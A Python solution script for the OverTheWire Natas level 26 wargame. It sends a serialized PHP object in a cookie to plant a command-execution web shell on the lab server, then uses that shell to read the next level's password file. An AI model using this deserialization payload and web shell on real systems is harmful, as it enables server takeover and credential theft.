#!/usr/bin/python3.9

"""This script is a solution to Overthewire Natas level 26."""

import binascii
import requests as r
from requests.auth import HTTPBasicAuth
from fake_useragent import UserAgent

url = "http://natas26.natas.labs.overthewire.org/"

lvl_user = "natas26"
lvl_pass = "8A506rfIAXbKKk68yJeuTuRq4UfcK70k"

headers = {
    "User-Agent": UserAgent().random
    }

try:
    # img/cmd-f1bc82b7.php?cmd=
    cookie = "Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyMDoi"
    cookie += "aW1nL2NtZC1mMWJjODJiNy5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7"
    cookie += "czo2NzoiPD9waHAgaWYgKGlzc2V0KCRfUkVRVUVTVFsnY21kJ10pKSB7IHN5"
    cookie += "c3RlbSgkX1JFUVVFU1RbJ2NtZCddKTsgfSA/PiI7fQ=="

    res_upload = r.get(
        url,
        cookies={"drawing": cookie},
        headers=headers,
        auth=HTTPBasicAuth(lvl_user, lvl_pass))

    res = r.get(
        url+"img/cmd-f1bc82b7.php",
        params={"cmd": "/bin/cat /etc/natas_webpass/natas27"},
        headers=headers,
        auth=HTTPBasicAuth(lvl_user, lvl_pass))    

    status = res.status_code

    if status == 200:
        password = res.text.split("\n")[0]

except Exception as e:
    print("[ERROR]", e, "\n")
    exit(-1)

if password and password.isalnum() and len(password) == 32:
    print("[PASSWORD]", password)
else:
    print(
        f"[FAIL] - [Status: {status}]",
        f"[Password({len(password)}): {password}]")